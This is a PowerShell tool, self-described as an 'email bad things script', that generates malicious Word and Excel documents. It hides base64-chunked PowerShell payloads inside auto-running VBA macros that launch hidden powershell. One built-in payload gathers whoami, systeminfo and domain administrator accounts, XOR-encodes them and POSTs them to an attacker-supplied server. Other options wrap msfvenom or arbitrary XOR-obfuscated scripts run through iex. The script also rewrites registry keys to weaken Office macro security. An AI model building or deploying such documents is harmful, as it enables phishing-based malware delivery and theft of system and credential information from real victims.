function convertto-vba ($script, $lengthoflines=900, $enc=$false)
{
if(!($enc)){
$bytes = [system.text.encoding]::unicode.getbytes($script)
$scripttoconvert = [convert]::ToBase64String($bytes)
}
else{$scripttoconvert = $script}
$length = $scripttoconvert.Length
$all = new-object collections.generic.list[string]
do{
$lastchar = $lengthoflines
if ($length -lt $lengthoflines){
    $lastchar = $scripttoconvert.length}
    $redo = $true
    do{$random = -join ((65..90) | get-random -count 4 | % {[char]$_})
    if($random -in "end","sub","xor"){$redo=$False}
    if(get-variable -name $random -ErrorAction ignore){$redo = $False}
    }
until($redo)
New-Variable -Name $random -value ($scripttoconvert.Substring(0,$lastchar)) 
$all.add("$random")
$scripttoconvert = $scripttoconvert.Remove(0,$lastchar)
$length = $scripttoconvert.length
}
while($length -gt 0)
#output
$finalvariable = -join ((65..90) + (97..122) | get-random -count 4 | % {[char]$_}) 
$total = @()
$total += "Sub Auto_Open`n"
foreach ($varname in $all){$total+="Dim $varname as String`n"}
$total+="Dim $finalvariable as String`n"
$total+="Dim obj`n"
foreach ($value in $all){
$data = Get-Variable $value -ValueOnly
if ($data){
$total+="$value = `"$data`"`n"}}
switch($all.count){
{$_ -lt 100} {
$laststring = $all[0..($all.count)] -join ' + '
$total+="$finalvariable=$laststring`n"
break}
{$_ -lt 200} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
break}
{$_ -lt 300} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..200] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
$laststring3 = $all[201..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring3"
break}
{$_ -lt 400} {
$laststring = $all[0..100] -join ' + '
$total+="$finalvariable=$laststring"
$laststring2 = $all[101..200] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring2"
$laststring3 = $all[201..300] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring3"
$laststring4 = $all[301..($all.count)] -join ' + '
$total+="$finalvariable=$finalvariable+$laststring4"
break}
Default {"script too long"}
}
$total+=@"

Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "powershell.exe", " -enc " + $finalvariable, Null, Null, 0
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
"@
return $total

}
Function get-filename($title, $filter)
{
[System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms")|out-null
$desktopdir = [Environment]::GetFolderPath("Desktop")
$openfiledialog = New-Object System.Windows.Forms.OpenFileDialog
$openfiledialog.InitialDirectory = $desktopdir
$openfiledialog.filter = $filter
$openfiledialog.Title = $title
$result = $openfiledialog.ShowDialog()
if ($result -eq "OK"){
$openfiledialog.FileName
}
else{write-host "No file chosen";break}}
function encode-text ($plaintext, $key)
{
    $tonumbers = [int[]][char[]]$plaintext -join ' '
    $cyphertext = ""
    $plainarray = $tonumbers.tostring().tochararray()
    for($i = 0; $i -lt $plainarray.length; $i++){
        $cyphertext += [char]([byte][char]$plainarray[$i] -bxor $Key[$i % $key.length])}
    return $cyphertext
}
function decode-text ($cyphertext, $key)
{
    $decrypted=@()
    $keyarray = $key.ToCharArray()
    for($i = 0; $i -lt $cyphertext.length; $i++){
        $decrypted +=[char]([char][byte]$cyphertext[$i] -bxor $key[$i % $key.length])}
    $decoded = [char[]][int[]]($decrypted -join '' -split ' ') -join ''
    return $decoded
        }

function new-vbaiprange ($start, $end)
{
$iparray= @()
$ip1 = ([System.Net.IPAddress]$start).GetAddressBytes()
[Array]::Reverse($ip1)
$ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
$ip2 = ([System.Net.IPAddress]$end).GetAddressBytes()
[Array]::Reverse($ip2)
$ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
for ($x = $ip1;$x -le $ip2;$x++){
    $ip = ([System.Net.IPAddress]$x).GetAddressBytes()
    [Array]::Reverse($ip)
    $iparray+=$ip -join '.'
}
$attackips = ($iparray|%{"`"$_`""}) -join ", "
$iprangeformat = "targets = Array($attackips)"
#figure out how many lines we'll need since vba strings can't be longer than 900ish characters
$index = [math]::Floor($iprangeformat.Length/900)
#max continuation of 25 lines
if ($index -gt 25){write-warning "Too many IPs, choose smaller amount"; exit}
$i = 0
$lastcomma = 0
$vbaiprangearray = @()
#grab 900 characters, then find the last comma in that substring and add it to the array and start over from that comma
if ($iprangeformat.length -gt 900){
    while ($i -lt $index)
        {
        $payloadsection = $iprangeformat.substring($lastcomma,900)
        $lastcomma = ($iprangeformat[0..($lastcomma+900)] -join '').LastIndexOf(',')
        $lastpayloadcomma = $payloadsection.LastIndexOf(',')
        $payloadtocomma = $payloadsection[0..$lastpayloadcomma]
        $payloadtocomma = ($payloadtocomma -join '').TrimStart(',')
        $vbaiprangearray += $payloadtocomma+" _"
        $i+=1
        }
    }
#grab the last bit of data
$remainingdata = $iprangeformat[$lastcomma..($iprangeformat.Length-1)]
$remainingdata = ($remainingdata -join '').TrimStart(',')
if ($remainingdata -ne 0){
    $vbaiprangearray += $remainingdata
    }
return $vbaiprangearray

}

$repeat=$true
while($repeat){
write-host "All in one email bad things script"
write-host "Press 1 to use a VBA macro that extracts systeminfo and exfiltrates with a http POST request to a web ip of your choice"
write-host "Press 2 for msfvenom psh-cmd"
write-host "Press 3 to use powershell"
$whichemail = read-host "Press 1 2 3 or X to escape"
switch ($whichemail){
"x"{$repeat=$false;break}
"1"{
[ipaddress]$maliciouslink = read-host "Whats the IP of your webserver?"
$maliciousuri = read-host "Create an inconspicuous URI"
$maliciouscomplete = "http://"+$maliciouslink+":443"+"/"+$maliciousuri
write-host "Document to extract syteminformation chosen.  Using the address of http://$maliciouslink/$maliciousuri"
Write-Host "Ensure you have your POST Server script running to catch the data!"
$postpayload = @()
$postpayload += @'
$exfil = @()
$exfil += whoami
$exfil += systeminfo
try{
Add-type -assemblyname system.directory.services.accountmanagement -erroraction stop
$ct = [system.directoryservices.accountmanagement.contexttype]::Domain
$group=[system.directoryservices.accountmanagement.groupprincipal]::FindByIdentity($ct,'Administrators')
$exfil += $group.getmembers($true) | select samaccountname,lastpasswordset,name,userprincipalname,enabled
}
catch{}
function encode-text ($plaintext, $key)
{
    $tonumbers = [int[]][char[]]$plaintext -join ' '
    $cyphertext = ""
    $plainarray = $tonumbers.tostring().tochararray()
    for($i = 0; $i -lt $plainarray.length; $i++){
        $cyphertext += [char]([byte][char]$plainarray[$i] -bxor $Key[$i % $key.length])}
    return $cyphertext
}
$exfilencode = encode-text ($exfil|out-string) "a"

'@
$postpayload += "Invoke-WebRequest -uri $maliciouscomplete -usedefaultcredentials -method POST -body `$exfilencode -UserAgent (`$([Microsoft.Powershell.Commands.PSUserAgent]::InternetExplorer))"
$vbaencrypted = convertto-vba $postpayload |Out-String
$vbamacro = $vbachecks + $vbaencrypted |Out-String
$repeat=$false
break}#endfirstpayload
"2"{
$vbamacro = @()
$content = get-content -raw (get-filename -title "Choose powershell file payload" -filter "Powershell/Text Files|*.ps1;*.txt;")
$enc = ($content -split ' ')[-1]
$vbaencrypted = convertto-vba -script $enc -enc $true
$vbamacro += $vbachecks
$vbamacro += $vbaencrypted

$repeat=$false
break
}#end2ndpayload
"3"{
$vbamacro = @()
$powershelldoc = get-content -raw (get-filename -title "Choose powershell file payload" -filter "Powershell/Text Files|*.ps1;*.txt;")
$encode = read-host "Encode (via XOR) Script? Y/(N)"
if($encode -eq "Y"){
$encoded = encode-text  $powershelldoc "a"
$newscript = @()
$newscript += @'
function decode-text ($cyphertext, $key)
{
    $decrypted=@()
    $keyarray = $key.ToCharArray()
    for($i = 0; $i -lt $cyphertext.length; $i++){
        $decrypted +=[char]([char][byte]$cyphertext[$i] -bxor $key[$i % $key.length])}
    $decoded = [char[]][int[]]($decrypted -join '' -split ' ') -join ''
    return $decoded
        }
'@
$newscript += "iex (decode-text $encoded `'a`')"
$newscript
$vbaencrypted = convertto-vba $newscript
$vbamacro += $vbachecks
$vbamacro += $vbaencrypted
}
else{
convertto-vba $powershelldoc
$vbaencrypted = convertto-vba $powershelldoc
$vbamacro += $vbachecks
$vbamacro += $vbaencrypted
}
$repeat=$false
break}#end3rdpayload
Default{
write-host "No payload chosen"}
}#end switch
}#end while

$template = get-filename -title "Choose your Office Document" -filter "Office Documents|*.doc;*.docx;*.xls;*.xlsx;"
$customname = read-host "What do you want your document to be named?"
if($customname -eq ''){$customname="evildoc"}
switch -Wildcard((gci $template).extension){
"*doc*"{
$word = New-Object -ComObject word.Application
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($word.version)\word\Security" -Name AccessVBOM -Value 1 -Force | out-null
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($word.version)\word\Security" -Name VBAWarnings -Value 1 -Force | out-null

<#switch ($($word.version))
Potential Social Engineering Code if Necessary
{
    "11.0" {$wordname = "2003"}
    "12.0" {$wordname = "2007"}
    "14.0" {$wordname = "2010"}
    "15.0" {$wordname = "2013"}
    "16.0" {$wordname = "2016"}
    }
#ensure we can access macros for the program
#>

$word.displayalerts = "0"
$worddoc = $word.documents.open($template)
$docmodule = $worddoc.vbproject.vbcomponents.item(1)
$docmodule.codemodule.addfromstring($vbamacro)
$fullpath = "$pwd\$customname.doc"
$worddoc.saveas([ref]$fullpath, [ref]0)
$worddoc.close()
$word.quit()
}

"*xls*"{
$excel = New-Object -ComObject Excel.Application
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($excel.version)\Excel\Security" -Name AccessVBOM -Value 1 -Force | out-null
New-ItemProperty -path "HKCU:\Software\Microsoft\Office\$($excel.version)\Excel\Security" -Name VBAWarnings -Value 1 -Force | out-null

$excel.Visible = $false
$excel.DisplayAlerts = $false
$excelwkbk = $excel.Workbooks.Open($template)
$mod = $excelwkbk.vbproject.vbcomponents.item(1)
$mod.CodeModule.AddFromString($vbamacro)
$fullpath = "$pwd\$customname.xls"
$excelwkbk.SaveAs([ref]$fullpath,[ref]56)
$excelwkbk.close()
$excel.quit()
}

}
write-host "Your Document is Available at $fullpath"